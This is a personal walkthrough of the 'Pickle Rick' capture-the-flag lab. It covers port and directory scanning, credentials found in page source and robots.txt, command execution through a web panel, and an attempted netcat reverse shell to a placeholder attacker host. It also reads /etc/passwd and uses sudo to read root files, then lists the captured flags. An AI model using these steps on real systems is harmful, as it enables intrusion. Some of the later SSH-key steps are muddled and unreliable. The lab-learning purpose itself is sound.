# Pickle Rick

Ran nmap to find open ports on the server machine

Nmap results:
22/tcp (SSH)
80/tcp (HTTP) Apache server on Ubuntu

SSH server can be logged into to gain root access

Run gobuster dir to find directories in the web server, using (dirbuster/directory-list-2.3-medium.txt)

Gobuster results:
/assets (301)
/server-status (403) (Forbidden access)

'server-status' will be useful to access

Searched assets, found nothing useful

Inspect page and view page source:
Username: R1ckRul3s

There is somewhere on this server that can be logged into to potentially access 'server-status'

Attempted to login to SSH with 'R1ckRul3s', permission denied due to public key. Means that 'R1ckRul3s' could be a valid SSH user

Ran gobuster again using different wordlist (dirb/common.txt)
New useful results:

/robots.txt

Went to robots.txt and found 'Wubbalubbadubdub', potential password to 'R1ckRul3s', but cannot log in because of public key authentication

Did final gobuster scan, this time including file extensions for php, txt, conf, and html to find hidden pages, found /login.php, which has username and password.

Entered 'R1ckRul3s' as username, and 'Wubbalubbadubdub' as password, successfully logged in and is redirected to commands page. Attempting to click the other pages in the nav bar is denied as only the real rick can access these pages, meaning there is another user within this web server

Viewing the page source leads to a comment which looks base 64 encoded:
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==

Decoding it with base64 binary leads to another base64 string, and then decoding the next string leads to another base64 string. After repeating the steps multiple times, leads to the string 'rabbit hole'

Entered 'whoami' into command, and it returned 'www-data', meaning the web server is vulnerable to remote code execution, and potentially reverse shells

Setup a netcat listener on attacker machine and ran 'nc attacker_ip attacker_port -e /bin/bash. Doesn't work, however omitting the -e argument does show a netcat connection being made, meaning that reverse shells don't work

Wrote 'ls' to check current directory, and found 'Sup3rS3cretPickl3Ingred.txt' which should have the first flag. Using 'cat Sup3rS3cretPickl3Ingred.txt' gives 'command disabled', meaning that cat cannot be used. However using 'less' instead of cat returns the contents of the file, that being the first flag:

mr. meeseek hair

The second useful file is 'clue.txt' which reads:

Look around the file system for the other ingredient.

This means traversing outside the /var/www/html directory for the commands are being executed from

Typing 'cat /etc/passwd' reveals only one created user, that being 'ubuntu'. This user can be used to login to the server via SSH

Typing 'ls ../../../home' reveals a 'rick' directory, and an 'ubuntu' directory, and within it, is 'second ingredients' file

Typing "less ../../../home/rick/'second ingredients'" gives the second flag:

1 jerry tear

After this, the next step will be to try and login to the server machine via SSH using the 'ubuntu' user. Since the server only allows SSH authentication, the next possible step is to inspect the 'ubuntu' user's .ssh directory.

The 'ubuntu' directory does contain a '.ssh' directory, however it cannot be read to by other users, so the key cannot be accessed by the command panel.

Could login as the rick user within the website and use the second ingredients as a password. Resetting the cookies allows me to go back to the login page.

None of the flags work, so will do a nikto scan to find any potential vulnerabilities that can be exploited on the server

Use 'sudo -l' to check the commands the user can use. Can run sudo for any command without password

Get saved key in authorized_keys in ubuntu user's .ssh directory with 'sudo less ../../../home/ubuntu/.ssh/authorized_keys'. Got:

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN

Create a key file for stored key and now SSH into the server as 'ubuntu' using the key file. Given this error:

Permissions 0644 for 'id_rsa' are too open.

Creating an 'ubuntu' user and changing the ownership of the key to ubuntu

Can ls root user using 'sudo ls /root' to find '3rd.txt'. And when read with 'sudo less /root/3rd.txt' the third flag is displayed:

fleeb juice